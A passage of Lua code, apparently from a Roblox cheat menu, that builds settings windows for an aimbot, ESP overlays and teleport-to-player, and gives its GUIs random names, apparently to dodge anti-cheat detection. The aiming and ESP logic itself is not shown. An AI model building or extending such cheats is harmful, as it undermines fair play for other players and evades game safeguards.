                vpaal.TextXAlignment = Enum.TextXAlignment.Left
                vpaal.Parent = vpm

                local vptb = Instance.new("TextButton")
                vptb.Size = UDim2.new(1, -20, 0, 32)
                vptb.Position = UDim2.new(0, 10, 0, 240)
                vptb.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
                vptb.BorderSizePixel = 0
                vptb.Text = "TP"
                vptb.TextColor3 = Color3.fromRGB(255, 255, 255)
                vptb.TextSize = 12
                vptb.Font = Enum.Font.GothamBold
                vptb.Parent = vpm
                Utils.RoundCorners(vptb, 6)
            
                vptb.MouseButton1Click:Connect(function()
                    if p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
                        if lp.Character and lp.Character:FindFirstChild("HumanoidRootPart") then
                            lp.Character.HumanoidRootPart.CFrame = p.Character.HumanoidRootPart.CFrame
                            vpg:Destroy()
                        end
                    else
                end
            end)
            end)
        end

        local statusUpdateConnection
        statusUpdateConnection = rs.Heartbeat:Connect(function()
            if not plg.Parent then
                statusUpdateConnection:Disconnect()
                return
            end
            
            for _, p in pairs(pl) do
                if p.Parent then

                    if p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
                        local hrp = p.Character.HumanoidRootPart
                        local currentPos = hrp.Position
                        local lastPos = playerPositions[p.UserId]
                        
                        if lastPos then
                            local distance = (currentPos - lastPos).Magnitude
                            if distance > 0.5 then

                                playerLastMove[p.UserId] = tick()
                            end
                        end
                        
                        playerPositions[p.UserId] = currentPos
                    end

                    if statusLabels[p.UserId] then
                        local status = getPlayerStatus(p)
                        statusLabels[p.UserId].Text = status
                    end
                end
            end
        end)

        plg:GetPropertyChangedSignal("Parent"):Connect(function()
            if not plg.Parent then
                if statusUpdateConnection then
                    statusUpdateConnection:Disconnect()
                end
            end
        end)
    end)

    Components.CreateLabel(contents["AIM UNIVERSAL"], "UNIVERSAL AIMBOT", Config.Theme.Accent)

    Components.CreateButton(contents["AIM UNIVERSAL"], "AIMBOT", function()
        local aimbotGui = Instance.new("ScreenGui")
        aimbotGui.Name = math.random(10000,99999)
        aimbotGui.ResetOnSpawn = false
        aimbotGui.Parent = pg
        
        local modalFrame = Instance.new("Frame")
        modalFrame.Size = UDim2.new(0, 280, 0, 320)
        modalFrame.Position = UDim2.new(0.5, -140, 0.5, -160)
        modalFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        modalFrame.BorderSizePixel = 0
        modalFrame.Parent = aimbotGui
        
        local corner = Instance.new("UICorner")
        corner.CornerRadius = UDim.new(0, 12)
        corner.Parent = modalFrame
        
        local border = Instance.new("UIStroke")
        border.Color = Color3.fromRGB(40, 40, 40)
        border.Thickness = 2
        border.Parent = modalFrame

        local titleBar = Instance.new("Frame")
        titleBar.Size = UDim2.new(1, 0, 0, 40)
        titleBar.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        titleBar.BorderSizePixel = 0
        titleBar.Parent = modalFrame
        
        local titleCorner = Instance.new("UICorner")
        titleCorner.CornerRadius = UDim.new(0, 12)
        titleCorner.Parent = titleBar
        
        local dragging = false
        local dragStart = nil
        local startPos = nil
        
        titleBar.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 then
                dragging = true
                dragStart = input.Position
                startPos = modalFrame.Position
            end
        end)
        
        titleBar.InputChanged:Connect(function(input)
            if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
                local delta = input.Position - dragStart
                modalFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
            end
        end)
        
        titleBar.InputEnded:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 then
                dragging = false
            end
        end)

        local titleLabel = Instance.new("TextLabel")
        titleLabel.Size = UDim2.new(1, -50, 1, 0)
        titleLabel.Position = UDim2.new(0, 10, 0, 0)
        titleLabel.BackgroundTransparency = 1
        titleLabel.Text = "AIMBOT SETTINGS"
        titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
        titleLabel.TextSize = 14
        titleLabel.Font = Enum.Font.GothamBold
        titleLabel.TextXAlignment = Enum.TextXAlignment.Left
        titleLabel.Parent = titleBar

        local closeButton = Instance.new("TextButton")
        closeButton.Size = UDim2.new(0, 30, 0, 30)
        closeButton.Position = UDim2.new(1, -35, 0, 5)
        closeButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
        closeButton.Text = "X"
        closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
        closeButton.TextSize = 14
        closeButton.Font = Enum.Font.GothamBold
        closeButton.Parent = titleBar
        
        local closeCorner = Instance.new("UICorner")
        closeCorner.CornerRadius = UDim.new(0, 8)
        closeCorner.Parent = closeButton
        
        closeButton.MouseButton1Click:Connect(function()
            aimbotGui:Destroy()
        end)

        local contentFrame = Instance.new("Frame")
        contentFrame.Size = UDim2.new(1, -16, 1, -50)
        contentFrame.Position = UDim2.new(0, 8, 0, 45)
        contentFrame.BackgroundTransparency = 1
        contentFrame.Parent = modalFrame

        local scrollFrame = Instance.new("ScrollingFrame")
        scrollFrame.Size = UDim2.new(1, 0, 1, 0)
        scrollFrame.BackgroundTransparency = 1
        scrollFrame.BorderSizePixel = 0
        scrollFrame.ScrollBarThickness = 6
        scrollFrame.Parent = contentFrame
        
        local listLayout = Instance.new("UIListLayout")
        listLayout.SortOrder = Enum.SortOrder.LayoutOrder
        listLayout.Padding = UDim.new(0, 5)
        listLayout.Parent = scrollFrame

        local enableFrame = Instance.new("Frame")
        enableFrame.Size = UDim2.new(1, 0, 0, 30)
        enableFrame.BackgroundTransparency = 1
        enableFrame.Parent = scrollFrame
        
        local enableLabel = Instance.new("TextLabel")
        enableLabel.Size = UDim2.new(0.65, 0, 1, 0)
        enableLabel.BackgroundTransparency = 1
        enableLabel.Text = "Enable Aimbot"
        enableLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
        enableLabel.TextSize = 13
        enableLabel.Font = Enum.Font.GothamBold
        enableLabel.TextXAlignment = Enum.TextXAlignment.Left
        enableLabel.Parent = enableFrame

        local enableToggle = Instance.new("TextButton")
        enableToggle.Size = UDim2.new(0, 45, 0, 22)
        enableToggle.Position = UDim2.new(1, -50, 0, 4)
        enableToggle.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
        enableToggle.Text = _G.AimbotSettings.Enabled and "ON" or "OFF"
        enableToggle.TextColor3 = Color3.fromRGB(255, 255, 255)
        enableToggle.TextSize = 11
        enableToggle.Font = Enum.Font.GothamBold
        enableToggle.BorderSizePixel = 0
        enableToggle.Parent = enableFrame
        
        local enableCorner = Instance.new("UICorner")
        enableCorner.CornerRadius = UDim.new(0, 6)
        enableCorner.Parent = enableToggle
        
        enableToggle.MouseButton1Click:Connect(function()
            _G.AimbotSettings.Enabled = not _G.AimbotSettings.Enabled
            enableToggle.Text = _G.AimbotSettings.Enabled and "ON" or "OFF"
        end)

        local fovToggleFrame = Instance.new("Frame")
        fovToggleFrame.Size = UDim2.new(1, 0, 0, 30)
        fovToggleFrame.BackgroundTransparency = 1
        fovToggleFrame.Parent = scrollFrame
        
        local fovToggleLabel = Instance.new("TextLabel")
        fovToggleLabel.Size = UDim2.new(0.65, 0, 1, 0)
        fovToggleLabel.BackgroundTransparency = 1
        fovToggleLabel.Text = "Show FOV Circle"
        fovToggleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
        fovToggleLabel.TextSize = 13
        fovToggleLabel.Font = Enum.Font.GothamBold
        fovToggleLabel.TextXAlignment = Enum.TextXAlignment.Left
        fovToggleLabel.Parent = fovToggleFrame

        local fovToggleButton = Instance.new("TextButton")
        fovToggleButton.Size = UDim2.new(0, 45, 0, 22)
        fovToggleButton.Position = UDim2.new(1, -50, 0, 4)
        fovToggleButton.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
        fovToggleButton.Text = _G.AimbotSettings.ShowFOV and "ON" or "OFF"
        fovToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
        fovToggleButton.TextSize = 11
        fovToggleButton.Font = Enum.Font.GothamBold
        fovToggleButton.BorderSizePixel = 0
        fovToggleButton.Parent = fovToggleFrame
        
        local fovToggleCorner = Instance.new("UICorner")
        fovToggleCorner.CornerRadius = UDim.new(0, 6)
        fovToggleCorner.Parent = fovToggleButton
        
        fovToggleButton.MouseButton1Click:Connect(function()
            _G.AimbotSettings.ShowFOV = not _G.AimbotSettings.ShowFOV
            fovToggleButton.Text = _G.AimbotSettings.ShowFOV and "ON" or "OFF"

            if _G.UpdateFOVCircle then
                _G.UpdateFOVCircle()
            end
        end)

        local keybindFrame = Instance.new("Frame")
        keybindFrame.Size = UDim2.new(1, 0, 0, 30)
        keybindFrame.BackgroundTransparency = 1
        keybindFrame.Parent = scrollFrame
        
        local keybindLabel = Instance.new("TextLabel")
        keybindLabel.Size = UDim2.new(0.4, 0, 1, 0)
        keybindLabel.BackgroundTransparency = 1
        keybindLabel.Text = "Hold Keybind: " .. _G.AimbotSettings.Keybind.Name
        keybindLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
        keybindLabel.TextSize = 11
        keybindLabel.Font = Enum.Font.GothamBold
        keybindLabel.TextXAlignment = Enum.TextXAlignment.Left
        keybindLabel.Parent = keybindFrame
        
        local keybindButton = Instance.new("TextButton")
        keybindButton.Size = UDim2.new(0, 70, 0, 22)
        keybindButton.Position = UDim2.new(1, -75, 0, 4)
        keybindButton.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
        keybindButton.Text = "Change"
        keybindButton.TextColor3 = Color3.fromRGB(255, 255, 255)
        keybindButton.TextSize = 11
        keybindButton.Font = Enum.Font.GothamBold
        keybindButton.Parent = keybindFrame
        
        local keybindCorner = Instance.new("UICorner")
        keybindCorner.CornerRadius = UDim.new(0, 6)
        keybindCorner.Parent = keybindButton
        
        local keybindOptions = {
            Enum.KeyCode.Q, Enum.KeyCode.E, Enum.KeyCode.R, Enum.KeyCode.T,
            Enum.KeyCode.F, Enum.KeyCode.G, Enum.KeyCode.H, Enum.KeyCode.V,
            Enum.KeyCode.B, Enum.KeyCode.N, Enum.KeyCode.M, Enum.KeyCode.LeftShift,
            Enum.KeyCode.RightShift, Enum.KeyCode.LeftControl, Enum.KeyCode.RightControl
        }
        
        local currentKeybindIndex = 1
        for i, key in ipairs(keybindOptions) do
            if key == _G.AimbotSettings.Keybind then
                currentKeybindIndex = i
                break
                    end
                end
        
        keybindButton.MouseButton1Click:Connect(function()
            currentKeybindIndex = currentKeybindIndex + 1
            if currentKeybindIndex > #keybindOptions then
                currentKeybindIndex = 1
            end
            _G.AimbotSettings.Keybind = keybindOptions[currentKeybindIndex]
            keybindLabel.Text = "Hold Keybind: " .. _G.AimbotSettings.Keybind.Name
        end)

        local sf = Instance.new("Frame")
        sf.Size = UDim2.new(1, 0, 0, 40)
        sf.BackgroundTransparency = 1
        sf.Parent = scrollFrame
        
        local slb = Instance.new("TextLabel")
        slb.Size = UDim2.new(1, 0, 0, 20)
        slb.BackgroundTransparency = 1
        slb.Text = "Smoothness: " .. _G.AimbotSettings.Smoothness
        slb.TextColor3 = Color3.fromRGB(255, 255, 255)
        slb.TextSize = 13
        slb.Font = Enum.Font.GothamBold
        slb.TextXAlignment = Enum.TextXAlignment.Left
        slb.Parent = sf
        
        local st = Instance.new("Frame")
        st.Size = UDim2.new(1, 0, 0, 5)
        st.Position = UDim2.new(0, 0, 0, 25)
        st.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
        st.BorderSizePixel = 0
        st.Parent = sf
        Utils.RoundCorners(st, 3)
        
        local sv = Instance.new("Frame")
        sv.Size = UDim2.new((_G.AimbotSettings.Smoothness - 0.1) / 0.9, 0, 1, 0)
        sv.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        sv.BorderSizePixel = 0
        sv.Parent = st
        Utils.RoundCorners(sv, 3)
        
        local sh = Instance.new("Frame")
        sh.Size = UDim2.new(0, 15, 0, 15)
        sh.Position = UDim2.new((_G.AimbotSettings.Smoothness - 0.1) / 0.9, 0, 0.5, 0)
        sh.AnchorPoint = Vector2.new(0.5, 0.5)
        sh.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        sh.BorderSizePixel = 0
        sh.Parent = st
        Utils.RoundCorners(sh, 3)
        
        local dr = false
        local function updateSmoothness()
            local ps = uis:GetMouseLocation()
            local fp = st.AbsolutePosition
            local fs = st.AbsoluteSize
            local rx = math.clamp((ps.X - fp.X) / fs.X, 0, 1)
            local vl = 0.1 + (rx * 0.9)
            _G.AimbotSettings.Smoothness = math.floor(vl * 100) / 100
            sv.Size = UDim2.new((_G.AimbotSettings.Smoothness - 0.1) / 0.9, 0, 1, 0)
            sh.Position = UDim2.new((_G.AimbotSettings.Smoothness - 0.1) / 0.9, 0, 0.5, 0)
            slb.Text = "Smoothness: " .. _G.AimbotSettings.Smoothness
        end
        
        sh.InputBegan:Connect(function(inp)
            if inp.UserInputType == Enum.UserInputType.MouseButton1 then
                dr = true
            end
        end)
        
        st.InputBegan:Connect(function(inp)
            if inp.UserInputType == Enum.UserInputType.MouseButton1 then
                dr = true
                updateSmoothness()
            end
        end)
        
        uis.InputChanged:Connect(function(inp)
            if dr and inp.UserInputType == Enum.UserInputType.MouseMovement then
                updateSmoothness()
            end
        end)
        
        uis.InputEnded:Connect(function(inp)
            if inp.UserInputType == Enum.UserInputType.MouseButton1 then
                dr = false
            end
        end)

        local ff = Instance.new("Frame")
        ff.Size = UDim2.new(1, 0, 0, 40)
        ff.BackgroundTransparency = 1
        ff.Parent = scrollFrame
        
        local flb = Instance.new("TextLabel")
        flb.Size = UDim2.new(1, 0, 0, 20)
        flb.BackgroundTransparency = 1
        flb.Text = "FOV: " .. _G.AimbotSettings.FOV
        flb.TextColor3 = Color3.fromRGB(255, 255, 255)
        flb.TextSize = 13
        flb.Font = Enum.Font.GothamBold
        flb.TextXAlignment = Enum.TextXAlignment.Left
        flb.Parent = ff
        
        local ft = Instance.new("Frame")
        ft.Size = UDim2.new(1, 0, 0, 5)
        ft.Position = UDim2.new(0, 0, 0, 25)
        ft.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
        ft.BorderSizePixel = 0
        ft.Parent = ff
        Utils.RoundCorners(ft, 3)
        
        local fv = Instance.new("Frame")
        fv.Size = UDim2.new((_G.AimbotSettings.FOV - 50) / 450, 0, 1, 0)
        fv.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        fv.BorderSizePixel = 0
        fv.Parent = ft
        Utils.RoundCorners(fv, 3)
        
        local fh = Instance.new("Frame")
        fh.Size = UDim2.new(0, 15, 0, 15)
        fh.Position = UDim2.new((_G.AimbotSettings.FOV - 50) / 450, 0, 0.5, 0)
        fh.AnchorPoint = Vector2.new(0.5, 0.5)
        fh.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        fh.BorderSizePixel = 0
        fh.Parent = ft
        Utils.RoundCorners(fh, 3)
        
        local fdr = false
        local function updateFOV()
            local ps = uis:GetMouseLocation()
            local fp = ft.AbsolutePosition
            local fs = ft.AbsoluteSize
            local rx = math.clamp((ps.X - fp.X) / fs.X, 0, 1)
            local vl = math.floor(50 + (rx * 450))
            _G.AimbotSettings.FOV = vl
            fv.Size = UDim2.new((_G.AimbotSettings.FOV - 50) / 450, 0, 1, 0)
            fh.Position = UDim2.new((_G.AimbotSettings.FOV - 50) / 450, 0, 0.5, 0)
            flb.Text = "FOV: " .. _G.AimbotSettings.FOV
            
                if pg:FindFirstChild("AimbotFOVCircle") then
                local fcg = pg.AimbotFOVCircle
                if fcg:FindFirstChild("FOVCircle") then
                    local fc2 = fcg.FOVCircle
                    fc2.Size = UDim2.new(0, _G.AimbotSettings.FOV, 0, _G.AimbotSettings.FOV)
                    fc2.Position = UDim2.new(0.5, -_G.AimbotSettings.FOV/2, 0.5, -_G.AimbotSettings.FOV/2)
                end
                    end
                end
                
        fh.InputBegan:Connect(function(inp)
            if inp.UserInputType == Enum.UserInputType.MouseButton1 then
                fdr = true
            end
        end)
        
        ft.InputBegan:Connect(function(inp)
            if inp.UserInputType == Enum.UserInputType.MouseButton1 then
                fdr = true
                updateFOV()
            end
        end)
        
        uis.InputChanged:Connect(function(inp)
            if fdr and inp.UserInputType == Enum.UserInputType.MouseMovement then
                updateFOV()
                end
        end)
        
        uis.InputEnded:Connect(function(inp)
            if inp.UserInputType == Enum.UserInputType.MouseButton1 then
                fdr = false
            end
        end)

        local boneFrame = Instance.new("Frame")
        boneFrame.Size = UDim2.new(1, 0, 0, 30)
        boneFrame.BackgroundTransparency = 1
        boneFrame.Parent = scrollFrame
        
        local boneLabel = Instance.new("TextLabel")
        boneLabel.Size = UDim2.new(0.4, 0, 1, 0)
        boneLabel.BackgroundTransparency = 1
        boneLabel.Text = "Target Bone: " .. _G.AimbotSettings.TargetBone
        boneLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
        boneLabel.TextSize = 11
        boneLabel.Font = Enum.Font.GothamBold
        boneLabel.TextXAlignment = Enum.TextXAlignment.Left
        boneLabel.Parent = boneFrame
        
        local boneButton = Instance.new("TextButton")
        boneButton.Size = UDim2.new(0, 70, 0, 22)
        boneButton.Position = UDim2.new(1, -75, 0, 4)
        boneButton.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
        boneButton.Text = "Change"
        boneButton.TextColor3 = Color3.fromRGB(255, 255, 255)
        boneButton.TextSize = 11
        boneButton.Font = Enum.Font.GothamBold
        boneButton.Parent = boneFrame
        
        local boneCorner = Instance.new("UICorner")
        boneCorner.CornerRadius = UDim.new(0, 6)
        boneCorner.Parent = boneButton
        
        local boneOptions = {"Head", "Torso", "HumanoidRootPart"}
        local currentBoneIndex = 1
        for i, bone in ipairs(boneOptions) do
            if bone == _G.AimbotSettings.TargetBone then
                currentBoneIndex = i
                break
            end
        end
        
        boneButton.MouseButton1Click:Connect(function()
            currentBoneIndex = currentBoneIndex + 1
            if currentBoneIndex > #boneOptions then
                currentBoneIndex = 1
            end
            _G.AimbotSettings.TargetBone = boneOptions[currentBoneIndex]
            boneLabel.Text = "Target Bone: " .. _G.AimbotSettings.TargetBone
        end)

        local teamFriendFrame = Instance.new("Frame")
        teamFriendFrame.Size = UDim2.new(1, 0, 0, 30)
        teamFriendFrame.BackgroundTransparency = 1
        teamFriendFrame.Parent = scrollFrame
        
        local teamFriendLabel = Instance.new("TextLabel")
        teamFriendLabel.Size = UDim2.new(0.65, 0, 1, 0)
        teamFriendLabel.BackgroundTransparency = 1
        teamFriendLabel.Text = "Team Check"
        teamFriendLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
        teamFriendLabel.TextSize = 13
        teamFriendLabel.Font = Enum.Font.GothamBold
        teamFriendLabel.TextXAlignment = Enum.TextXAlignment.Left
        teamFriendLabel.Parent = teamFriendFrame

        local teamFriendToggle = Instance.new("TextButton")
        teamFriendToggle.Size = UDim2.new(0, 45, 0, 22)
        teamFriendToggle.Position = UDim2.new(1, -50, 0, 4)
        teamFriendToggle.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
        teamFriendToggle.Text = (_G.AimbotSettings.TeamCheck and _G.AimbotSettings.FriendCheck) and "ON" or "OFF"
        teamFriendToggle.TextColor3 = Color3.fromRGB(255, 255, 255)
        teamFriendToggle.TextSize = 11
        teamFriendToggle.Font = Enum.Font.GothamBold
        teamFriendToggle.BorderSizePixel = 0
        teamFriendToggle.Parent = teamFriendFrame
        
        local teamFriendCorner = Instance.new("UICorner")
        teamFriendCorner.CornerRadius = UDim.new(0, 6)
        teamFriendCorner.Parent = teamFriendToggle
        
        teamFriendToggle.MouseButton1Click:Connect(function()
            _G.AimbotSettings.TeamCheck = not _G.AimbotSettings.TeamCheck
            _G.AimbotSettings.FriendCheck = not _G.AimbotSettings.FriendCheck
            teamFriendToggle.Text = (_G.AimbotSettings.TeamCheck and _G.AimbotSettings.FriendCheck) and "ON" or "OFF"
    end)

        scrollFrame.CanvasSize = UDim2.new(0, 0, 0, listLayout.AbsoluteContentSize.Y)

        closeButton.MouseButton1Click:Connect(function()
            aimbotGui:Destroy()
        end)
    end)

    _G.ESP_Settings = _G.ESP_Settings or {
        MaxDistance = 2000,
        UpdateRate = 0.1,
        LineColor = Color3.fromRGB(255, 255, 255),
        LineThickness = 1.5,
        ChamsColor = Color3.fromRGB(255, 255, 255),
        ChamsAllyColor = Color3.fromRGB(0, 170, 255)
    }

    Components.CreateSlider(contents["AIM UNIVERSAL"], "ESP Distance", 50, 2000, _G.ESP_Settings.MaxDistance or 2000, function(value)
        _G.ESP_Settings.MaxDistance = value
    end)

    Components.CreateButton(contents["AIM UNIVERSAL"], "ESP SETTINGS", function()

        local espSettingsGui = Instance.new("ScreenGui")
        espSettingsGui.Name = math.random(10000,99999)
        espSettingsGui.ResetOnSpawn = false
        espSettingsGui.Parent = pg

        local modalFrame = Instance.new("Frame")
        modalFrame.Size = UDim2.new(0, 280, 0, 320)
        modalFrame.Position = UDim2.new(0.5, -140, 0.5, -160)
        modalFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        modalFrame.BorderSizePixel = 0
        modalFrame.Parent = espSettingsGui

        local corner = Instance.new("UICorner")
        corner.CornerRadius = UDim.new(0, 12)
        corner.Parent = modalFrame

        local border = Instance.new("UIStroke")
        border.Color = Color3.fromRGB(40, 40, 40)
        border.Thickness = 2
        border.Parent = modalFrame

        local titleBar = Instance.new("Frame")
        titleBar.Size = UDim2.new(1, 0, 0, 40)
        titleBar.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        titleBar.BorderSizePixel = 0
        titleBar.Parent = modalFrame
        
        local titleCorner = Instance.new("UICorner")
        titleCorner.CornerRadius = UDim.new(0, 12)
        titleCorner.Parent = titleBar

        local dragging = false
        local dragStart = nil
        local startPos = nil
        
        titleBar.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 then
                dragging = true
                dragStart = input.Position
                startPos = modalFrame.Position
            end
        end)
        
        titleBar.InputChanged:Connect(function(input)
            if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
                local delta = input.Position - dragStart
                modalFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
            end
        end)
        
        titleBar.InputEnded:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 then
                dragging = false
            end
        end)

        local titleLabel = Instance.new("TextLabel")
        titleLabel.Size = UDim2.new(1, -50, 1, 0)
        titleLabel.Position = UDim2.new(0, 10, 0, 0)
        titleLabel.BackgroundTransparency = 1
        titleLabel.Text = "ESP SETTINGS"
        titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
        titleLabel.TextSize = 14
        titleLabel.Font = Enum.Font.GothamBold
        titleLabel.TextXAlignment = Enum.TextXAlignment.Left
        titleLabel.Parent = titleBar

        local closeBtn = Instance.new("TextButton")
        closeBtn.Size = UDim2.new(0, 30, 0, 30)
        closeBtn.Position = UDim2.new(1, -35, 0, 5)
        closeBtn.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
        closeBtn.Text = "X"
        closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        closeBtn.TextSize = 14
        closeBtn.Font = Enum.Font.GothamBold
        closeBtn.Parent = titleBar
        
        local closeCorner = Instance.new("UICorner")
        closeCorner.CornerRadius = UDim.new(0, 8)
        closeCorner.Parent = closeBtn
        
        closeBtn.MouseButton1Click:Connect(function()
            espSettingsGui:Destroy()
        end)

        local contentFrame = Instance.new("Frame")
        contentFrame.Size = UDim2.new(1, -16, 1, -50)
        contentFrame.Position = UDim2.new(0, 8, 0, 45)
        contentFrame.BackgroundTransparency = 1
        contentFrame.Parent = modalFrame

        local scrollFrame = Instance.new("ScrollingFrame")
        scrollFrame.Size = UDim2.new(1, 0, 1, 0)
        scrollFrame.BackgroundTransparency = 1
        scrollFrame.BorderSizePixel = 0
        scrollFrame.ScrollBarThickness = 6
        scrollFrame.Parent = contentFrame
        
        local listLayout = Instance.new("UIListLayout")
        listLayout.SortOrder = Enum.SortOrder.LayoutOrder
        listLayout.Padding = UDim.new(0, 5)
        listLayout.Parent = scrollFrame

        local tf = Instance.new("Frame")
        tf.Size = UDim2.new(1, 0, 0, 40)
        tf.BackgroundTransparency = 1
        tf.Parent = scrollFrame
        
        local tl = Instance.new("TextLabel")
        tl.Size = UDim2.new(1, 0, 0, 18)
        tl.BackgroundTransparency = 1
        tl.Text = "LINE THICKNESS:"
        tl.TextColor3 = Color3.fromRGB(255, 255, 255)
        tl.TextSize = 13
        tl.Font = Enum.Font.GothamBold
        tl.TextXAlignment = Enum.TextXAlignment.Left
        tl.Parent = tf
        
        local tt = Instance.new("Frame")
        tt.Size = UDim2.new(1, 0, 0, 5)
        tt.Position = UDim2.new(0, 0, 0, 22)
        tt.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
        tt.BorderSizePixel = 0
        tt.Parent = tf
        Utils.RoundCorners(tt, 3)
        
        local tv = (_G.ESP_Settings.LineThickness or 1.5)
        local tvn = ((tv - 0.5) / 4.5)
        
        local tsv = Instance.new("Frame")
        tsv.Size = UDim2.new(tvn, 0, 1, 0)
        tsv.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        tsv.BorderSizePixel = 0
        tsv.Parent = tt
        Utils.RoundCorners(tsv, 3)
        
        local tsh = Instance.new("Frame")
        tsh.Size = UDim2.new(0, 15, 0, 15)
        tsh.Position = UDim2.new(tvn, 0, 0.5, 0)
        tsh.AnchorPoint = Vector2.new(0.5, 0.5)
        tsh.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        tsh.BorderSizePixel = 0
        tsh.Parent = tt
        Utils.RoundCorners(tsh, 3)
        
        local tvl = Instance.new("TextLabel")
        tvl.Size = UDim2.new(1, 0, 0, 15)
        tvl.Position = UDim2.new(0, 0, 0, 30)
        tvl.BackgroundTransparency = 1
        tvl.Text = "Value: " .. tv
        tvl.TextColor3 = Color3.fromRGB(255, 255, 255)
        tvl.TextSize = 12
        tvl.Font = Enum.Font.Gotham
        tvl.TextXAlignment = Enum.TextXAlignment.Center
        tvl.Parent = tf
        
        local tdr = false
        local function updateThickness()
            local ps = uis:GetMouseLocation()
            local fp = tt.AbsolutePosition
            local fs = tt.AbsoluteSize
            local rx = math.clamp((ps.X - fp.X) / fs.X, 0, 1)
            local vl = math.floor((0.5 + (rx * 4.5)) * 100) / 100
            tv = vl
            tvn = ((tv - 0.5) / 4.5)
            tsv.Size = UDim2.new(tvn, 0, 1, 0)
            tsh.Position = UDim2.new(tvn, 0, 0.5, 0)
            tvl.Text = "Value: " .. tv
            _G.ESP_Settings.LineThickness = tv
            
            for p, el in pairs(_G.ESP_Elements or {}) do
                if el.line then
                    el.line.Thickness = tv
                end
                    end
                end
                
        tsh.InputBegan:Connect(function(inp)
            if inp.UserInputType == Enum.UserInputType.MouseButton1 then
                tdr = true
            end
        end)
        
        tt.InputBegan:Connect(function(inp)
            if inp.UserInputType == Enum.UserInputType.MouseButton1 then
                tdr = true
                updateThickness()
            end
        end)
        
        uis.InputChanged:Connect(function(inp)
            if tdr and inp.UserInputType == Enum.UserInputType.MouseMovement then
                updateThickness()
            end
        end)
        
        uis.InputEnded:Connect(function(inp)
            if inp.UserInputType == Enum.UserInputType.MouseButton1 then
                tdr = false
            end
        end)

        Components.CreateDropdown(scrollFrame, "NAME FORMAT", 
            {"Display Name", "Username", "Both (Display + @Username)"}, 
            function(option, index)
                local formatMap = {
                    ["Display Name"] = "display",
                    ["Username"] = "username",
                    ["Both (Display + @Username)"] = "both"
                }
                _G.ESP_Settings.NameFormat = formatMap[option] or "both"

                for p, el in pairs(_G.ESP_Elements or {}) do
                    if el.gui and el.gui:FindFirstChild("TextLabel") then
                        local textLabel = el.gui:FindFirstChild("TextLabel")
                        if textLabel then
                            local displayName = p.DisplayName
                            local username = p.Name
                            local format = _G.ESP_Settings.NameFormat
                            
                            if format == "display" then
                                textLabel.Text = displayName
                            elseif format == "username" then
                                textLabel.Text = username
                            else
                                if displayName == username then
                                    textLabel.Text = displayName
                                else
                                    textLabel.Text = displayName .. " (@" .. username .. ")"
                                end
                            end
                        end
                    end
                end
            end
        )

        local function createColorSlider(p, l, v, uf)
            local sf = Instance.new("Frame")
            sf.Size = UDim2.new(1, 0, 0, 35)
            sf.BackgroundTransparency = 1
            sf.Parent = p
            
            local st = Instance.new("Frame")
            st.Size = UDim2.new(1, 0, 0, 5)
            st.Position = UDim2.new(0, 0, 0, 0)
            st.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
            st.BorderSizePixel = 0
            st.Parent = sf
            Utils.RoundCorners(st, 3)
            
            local sv = Instance.new("Frame")
            sv.Size = UDim2.new(v / 255, 0, 1, 0)
            sv.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            sv.BorderSizePixel = 0
            sv.Parent = st
            Utils.RoundCorners(sv, 3)
            
            local sh = Instance.new("Frame")
            sh.Size = UDim2.new(0, 15, 0, 15)
            sh.Position = UDim2.new(v / 255, 0, 0.5, 0)
            sh.AnchorPoint = Vector2.new(0.5, 0.5)
            sh.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            sh.BorderSizePixel = 0
            sh.Parent = st
            Utils.RoundCorners(sh, 3)
            
            local sl = Instance.new("TextLabel")
            sl.Size = UDim2.new(1, 0, 0, 15)
            sl.Position = UDim2.new(0, 0, 0, 10)
            sl.BackgroundTransparency = 1
            sl.Text = l .. ": " .. v
            sl.TextColor3 = Color3.fromRGB(255, 255, 255)
            sl.TextSize = 12
            sl.Font = Enum.Font.Gotham
            sl.TextXAlignment = Enum.TextXAlignment.Center
            sl.Parent = sf
            
            local dr = false
            local function update()
                local ps = uis:GetMouseLocation()
                local fp = st.AbsolutePosition
